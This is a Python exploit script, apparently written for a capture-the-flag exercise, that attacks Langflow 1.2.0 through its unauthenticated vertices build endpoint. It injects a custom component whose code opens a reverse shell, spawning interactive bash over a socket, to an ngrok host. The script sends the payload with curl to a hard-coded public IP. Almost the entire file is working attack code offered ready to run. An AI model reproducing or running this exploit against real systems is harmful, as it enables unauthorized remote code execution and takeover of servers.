#!/usr/bin/env python3
"""
Reverse shell via Langflow (sem JWT): POST /api/v1/build/{uuid}/vertices

Antes de correr:
  1) nc -lvnp 4444
  2) ngrok tcp 4444   (ex.: tcp://0.tcp.sa.ngrok.io:12400 -> localhost:4444)

Depois:
  python3 Parte2_reverse_vertices.py
  python3 Parte2_reverse_vertices.py --ngrok-host OUTRO.host --ngrok-port 12345

A resposta HTTP pode ser 500 com "Run ID not set"; a thread da shell corre na mesma.
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import tempfile


def build_malicious_code(ngrok_host: str, ngrok_port: int) -> str:
    return f"""import threading as T
import socket
import subprocess
import os

def _rev():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{ngrok_host}", {ngrok_port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

def _go():
    t = T.Thread(target=_rev, daemon=True)
    t.start()

_x = _go()

from langflow.custom.custom_component.component import Component
from langflow.template.field.base import Output
from langflow.schema.data import Data

class ExploitComp(Component):
    display_name = "X"
    outputs = [Output(display_name="O", name="o", method="r", types=["Data"])]
    def r(self) -> Data:
        return Data(data={{}})
"""


def build_body(code: str) -> dict:
    node = {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
            "id": "Exploit-001",
            "type": "ExploitComp",
            "node": {
                "template": {
                    "code": {
                        "type": "code",
                        "required": True,
                        "show": True,
                        "multiline": True,
                        "value": code,
                        "name": "code",
                        "password": False,
                        "advanced": False,
                        "dynamic": False,
                    },
                    "_type": "Component",
                },
                "description": "X",
                "base_classes": ["Data"],
                "display_name": "ExploitComp",
                "name": "ExploitComp",
                "frozen": False,
                "outputs": [
                    {
                        "types": ["Data"],
                        "selected": "Data",
                        "name": "o",
                        "display_name": "O",
                        "method": "r",
                        "value": "__UNDEFINED__",
                        "cache": True,
                        "allows_loop": False,
                        "tool_mode": False,
                    }
                ],
                "field_order": ["code"],
                "beta": False,
                "edited": False,
            },
        },
    }
    return {"nodes": [node], "edges": []}


def main() -> None:
    ap = argparse.ArgumentParser(description="Dispara reverse shell contra Langflow 1.2.0 (vertices).")
    ap.add_argument("--target", default="3.89.86.52", help="IP ou hostname HTTP do alvo")
    ap.add_argument("--host-header", default="flow.projects-blogo.sy", help="Cabeçalho Host")
    ap.add_argument("--flow-id", default="00000000-0000-0000-0000-000000000001", help="UUID no path")
    ap.add_argument("--ngrok-host", default="0.tcp.sa.ngrok.io", help="Host TCP público do ngrok")
    ap.add_argument("--ngrok-port", type=int, default=12400, help="Porta TCP pública do ngrok")
    ap.add_argument("--timeout", type=int, default=30, help="Timeout do pedido em segundos")
    args = ap.parse_args()

    code = build_malicious_code(args.ngrok_host, args.ngrok_port)
    body = build_body(code)
    url = f"http://{args.target}/api/v1/build/{args.flow_id}/vertices"

    print(f"[*] POST {url}")
    print(f"[*] Host: {args.host_header}")
    print(f"[*] Reverse para {args.ngrok_host}:{args.ngrok_port} (ngrok -> teu nc)")
    print("[*] Garante: nc -lvnp 4444 E ngrok a apontar para essa porta.\n")

    fd, path = tempfile.mkstemp(suffix=".json")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(body, f)
        proc = subprocess.run(
            [
                "curl",
                "-sS",
                "--max-time",
                str(args.timeout),
                "-w",
                "\n[http_code:%{http_code}]",
                "-X",
                "POST",
                url,
                "-H",
                f"Host: {args.host_header}",
                "-H",
                "Content-Type: application/json",
                "--data-binary",
                f"@{path}",
            ],
            capture_output=True,
            text=True,
        )
        out = (proc.stdout or "") + (proc.stderr or "")
        if "http_code:2" in out:
            print(f"[+] Resposta:\n{out[:2500]}")
        else:
            print(f"[!] Resposta (500 com 'Run ID not set' é esperado):\n{out[:2500]}")
        if proc.returncode != 0:
            print(f"[!] curl exit {proc.returncode}")
    except FileNotFoundError:
        print("[!] Instala curl ou usa o mesmo pedido manualmente.")
    except Exception as e:
        print(f"[!] Erro: {e}")
        print("    Confirma IP do CTF e /etc/hosts se usares nome em vez de IP.")
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass

    print("\n[*] Olha o terminal do netcat; se não aparecer shell, ngrok/porta ou egress do alvo podem bloquear.")


if __name__ == "__main__":
    main()
